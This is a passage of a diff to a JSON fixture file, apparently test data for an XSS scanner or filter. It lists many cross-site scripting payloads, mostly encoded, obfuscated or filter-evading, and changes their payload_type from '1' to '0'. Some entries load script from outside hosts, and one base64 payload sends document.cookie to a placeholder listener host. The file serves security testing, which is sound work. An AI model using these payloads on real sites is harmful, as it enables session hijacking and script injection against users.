     "payload_text": "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('XSS');\">",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<http://>;",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http://;URL=javascript:alert('XSS');\">",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<IFRAME SRC=\"javascript:alert('XSS');\"></IFRAME>",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<IFRAME SRC=# onmouseover=\"alert(document.cookie)\"></IFRAME>",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<FRAMESET><FRAME SRC=\"javascript:alert('XSS');\"></FRAMESET>",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<TABLE BACKGROUND=\"javascript:alert('XSS')\">",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<TABLE><TD BACKGROUND=\"javascript:alert('XSS')\">",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<DIV STYLE=\"background-image: url(javascript:alert('XSS'))\">",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<DIV STYLE=\"background-image:\\0075\\0072\\006C\\0028'\\006a\\0061\\0076\\0061\\0073\\0063\\0072\\0069\\0070\\0074\\003a\\0061\\006c\\0065\\0072\\0074\\0028.1027\\0058.1053\\0053\\0027\\0029'\\0029\">",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<DIV STYLE=\"background-image: url(\u0001javascript:alert('XSS'))\">",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<DIV STYLE=\"width: expression(alert('XSS'));\">",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<!--[if gte IE 4]>\n<SCRIPT>alert('XSS');</SCRIPT>\n<![endif]-->\n",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "//",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "images/image.jpg",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "/images/image.jpg",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<BASE HREF=\"javascript:alert('XSS');//\">",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<OBJECT TYPE=\"text/x-scriptlet\" DATA=\"http://xss.rocks/scriptlet.html\"></OBJECT>",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<EMBED SRC=\"http://ha.ckers.org/xss.swf\" AllowScriptAccess=\"always\"></EMBED>",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "allowScriptAccess=\"never\"",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "allownetworking=\"internal\"",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<EMBED SRC=\"data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==\" type=\"image/svg+xml\" AllowScriptAccess=\"always\"></EMBED>",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "a=\"get\";\nb=\"URL(\\\"\";\nc=\"javascript:\";\nd=\"alert('XSS');\\\")\"; \neval(a+b+c+d);\n",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<XML ID=\"xss\"><I><B><IMG SRC=\"javas<!-- -->cript:alert('XSS')\"></B></I></XML> \n<SPAN DATASRC=\"#xss\" DATAFLD=\"B\" DATAFORMATAS=\"HTML\"></SPAN>\n",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<XML SRC=\"xsstest.xml\" ID=I></XML>  \n<SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>\n",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<HTML><BODY>\n<?xml:namespace prefix=\"t\" ns=\"urn:schemas-microsoft-com:time\">\n<?import namespace=\"t\" implementation=\"#default#time2\">\n<t:set attributeName=\"innerHTML\" to=\"XSS<SCRIPT DEFER>alert(\"XSS\")</SCRIPT>\">\n</BODY></HTML>\n",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<SCRIPT SRC=\"http://xss.rocks/xss.jpg\"></SCRIPT>",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<!--#exec cmd=\"/bin/echo '<SCR'\"--><!--#exec cmd=\"/bin/echo 'IPT SRC=http://xss.rocks/xss.js></SCRIPT>'\"-->",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<?",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<IMG SRC=\"http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode\">",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<IMG SRC=\"httx://badguy.com/a.jpg\">",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<META",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<META HTTP-EQUIV=\"Set-Cookie\" Content=\"USERID=<SCRIPT>alert('XSS')</SCRIPT>\">",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<HEAD><META HTTP-EQUIV=\"CONTENT-TYPE\" CONTENT=\"text/html; charset=UTF-7\"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<SCRIPT>",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<SCRIPT SRC...",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "/\\<script\\[^\\>\\]+src/i",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<SCRIPT a=\">\" SRC=\"httx://xss.rocks/xss.js\"></SCRIPT>",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<SCRIPT>",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "\\<script src...",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "/\\<script((\\\\s+\\\\w+(\\\\s\\*=\\\\s\\*(?:\"(.)\\*?\"|'(.)\\*?'|\\[^'\"\\>\\\\s\\]+))?)+\\\\s\\*|\\\\s\\*)src/i",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<SCRIPT =\">\" SRC=\"httx://xss.rocks/xss.js\"></SCRIPT>",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "/\\<script((\\\\s+\\\\w+(\\\\s\\*=\\\\s\\*(?:\"(.)\\*?\"|'(.)\\*?'|\\[^'\"\\>\\\\s\\]+))?)+\\\\s\\*|\\\\s\\*)src/i",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<SCRIPT a=\">\" '' SRC=\"httx://xss.rocks/xss.js\"></SCRIPT>",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "/\\<script((\\\\s+\\\\w+(\\\\s\\*=\\\\s\\*(?:\"(.)\\*?\"|'(.)\\*?'|\\[^'\"\\>\\\\s\\]+))?)+\\\\s\\*|\\\\s\\*)src/i",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<SCRIPT>",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<SCRIPT>",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<SCRIPT \"a='>'\" SRC=\"httx://xss.rocks/xss.js\"></SCRIPT>",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "/\\<script((\\\\s+\\\\w+(\\\\s\\*=\\\\s\\*(?:\"(.)\\*?\"|'(.)\\*?'|\\[^'\"\\>\\\\s\\]+))?)+\\\\s\\*|\\\\s\\*)src/i",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<SCRIPT a=",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": " SRC=\"httx://xss.rocks/xss.js\"></SCRIPT>",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<SCRIPT a=\">'>\" SRC=\"httx://xss.rocks/xss.js\"></SCRIPT>",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<SCRIPT>document.write(\"<SCRI\");</SCRIPT>PT SRC=\"httx://xss.rocks/xss.js\"></SCRIPT>",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "http://www.google.com/",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<A HREF=\"http://66.102.7.147/\">XSS</A>",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<A HREF=\"http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D\">XSS</A>",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<A HREF=\"http://1113982867/\">XSS</A>",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<A HREF=\"http://0x42.0x0000066.0x7.0x93/\">XSS</A>",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<A HREF=\"http://0102.0146.0007.00000223/\">XSS</A>",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<img onload=\"eval(atob('ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9saXN0ZXJuSVAvIitkb2N1bWVudC5jb29raWU='))\">",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<A",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "//",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "http://",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "(ht|f)tp(s)?://",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "//",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "\\\\\\\\",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<A HREF=\"//www.google.com/\">XSS</A>",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "keyword:",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "keyword:XSS+RSnake",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<A HREF=\"//google\">XSS</A>",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<A HREF=\"http://",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<A HREF=\"http://google:ha.ckers.org\">XSS</A>",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "www.",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<A HREF=\"http://google.com/\">XSS</A>",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<A HREF=\"http://www.google.com./\">XSS</A>",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<A HREF=\"javascript:document.location='http://www.google.com/'\">XSS</A>",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "http://www.google.com/",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "java&\\#x09;script:",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "java\tscript:",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<A HREF=\"http://www.google.com/ogle.com/\">XSS</A>",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "a href=\"/Share?content_type=1&title=<%=Encode.forHtmlAttribute(untrusted content title)%>\">Share</a>",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<a href=\"/share?content_type=1&title=This is a regular title&amp;content_type=1;alert(1)\">Share</a>",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "%3C",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "&lt",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "&lt;",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "&LT",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "&LT;",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "&#60",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "&#060",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "&#0060",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "&#00060",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "&#000060",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "&#0000060",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "&#60;",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "&#060;",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "&#0060;",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "&#00060;",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "&#000060;",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "&#0000060;",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "&#x3c",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "&#x03c",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "&#x003c",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "&#x0003c",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "&#x00003c",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "&#x000003c",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "&#x3c;",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "&#x03c;",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "&#x003c;",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "&#x0003c;",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "&#x00003c;",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "&#x000003c;",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "&#X3c",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "&#X03c",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "&#X003c",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "&#X0003c",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "&#X00003c",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "&#X000003c",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "&#X3c;",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "&#X03c;",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "&#X003c;",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "&#X0003c;",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "&#X00003c;",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "&#X000003c;",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "&#x3C",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "&#x03C",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "&#x003C",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "&#x0003C",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "&#x00003C",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "&#x000003C",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "&#x3C;",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "&#x03C;",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "&#x003C;",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "&#x0003C;",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "&#x00003C;",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "&#x000003C;",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "&#X3C",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "&#X03C",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "&#X003C",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "&#X0003C",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "&#X00003C",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "&#X000003C",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "&#X3C;",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "&#X03C;",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "&#X003C;",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "&#X0003C;",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "&#X00003C;",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "&#X000003C;",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "\\x3c",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "\\x3C",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "\\u003c",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "\\u003C",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "Example: <script> ... setTimeout(\\\\\"writetitle()\\\\\",$\\_GET\\[xss\\]) ... </script>\nExploitation: /?xss=500); alert(document.cookie);//\n",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "Example: <script> ... eval($\\_GET\\[xss\\]); ... </script>\nExploitation: /?xss=document.cookie\n",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "...\nheader('Location: '.$_GET['param']);\n...\n",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "..\nheader('Refresh: 0; URL='.$_GET['param']); \n...\n",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "/?param=<javascript:alert(document.cookie>)",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "/?param=<data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<Img src = x onerror = \"javascript: window.onerror = alert; throw XSS\">",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<Video> <source onerror = \"javascript: alert (XSS)\">",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<Input value = \"XSS\" type = text>",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<applet code=\"javascript:confirm(document.cookie);\">",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<isindex x=\"javascript:\" onmouseover=\"alert(XSS)\">",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "\"></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "\"><img src=\"x:x\" onerror=\"alert(XSS)\">",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "\"><iframe src=\"javascript:alert(XSS)\">",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<object data=\"javascript:alert(XSS)\">",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<isindex type=image src=1 onerror=alert(XSS)>",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<img src=x:alert(alt) onerror=eval(src) alt=0>",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<img src=\"x:gif\" onerror=\"window['al\\u0065rt'](0)\"></img>",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<iframe/src=\"data:text/html,<svg onload=alert(1)>\">",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<meta content=\"&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)\" http-equiv=\"refresh\"/>",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<meta http-equiv=\"refresh\" content=\"0;url=javascript:confirm(1)\">",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<form><a href=\"javascript:\\u0061lert(1)\">X",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "</script><img/*%00/src=\"worksinchrome&colon;prompt(1)\"/%00*/onerror='eval(src)'>",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<style>//*{x:expression(alert(/xss/))}//<style></style>",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
